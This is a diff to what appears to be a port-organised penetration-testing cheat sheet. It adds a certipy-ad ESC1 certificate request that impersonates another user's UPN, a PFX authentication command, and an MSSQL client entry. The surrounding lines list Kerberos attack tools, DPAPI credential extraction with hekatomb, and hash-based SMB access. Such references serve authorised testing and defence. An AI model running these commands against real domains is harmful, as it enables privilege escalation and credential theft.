@@ -92,6 +92,10 @@ nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
 
 
 ## 88
+- certipy-ad
+```sh
+certipy-ad auth -pfx 'FILENAME' -dc-ip 'IP'
+```
 - impacket-GetNPUsers ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
 - impacket-GetUserSPNs
 - kerbrute ![GitHub Repo stars](https://img.shields.io/github/stars/ropnop/kerbrute?style=social)
@@ -197,6 +201,11 @@ nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
 ```sh
 # DPAPI blob (TCP53番とTCP389番も使用)
 hekatomb 'DOMAIN/USERNAME:PASSWORD@IP'
+```
+- certipy-ad ![GitHub Repo stars](https://img.shields.io/github/stars/ly4k/Certipy?style=social)
+```sh
+# ESC1
+certipy-ad req -ca 'NAME_CA' -template 'NAME_TEMPLATE' -upn 'USERNAME'@'DOMAIN' -out 'FILENAME' -target 'IP' -u 'USERNAME' -p 'PASSWORD'
 ```
 - enum4linux ![GitHub Repo stars](https://img.shields.io/github/stars/CiscoCXSecurity/enum4linux?style=social)
 - enum4linux-ng ![GitHub Repo stars](https://img.shields.io/github/stars/cddmp/enum4linux-ng?style=social)
@@ -308,6 +317,10 @@ smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursiv
     ```sh
     nmap -n -Pn -p445 --script=smb-vuln-ms08-067 'IP'
     ```
+
+
+## 1433
+- impacket-mssqlclient
 
 
 ## 5060 (UDP)
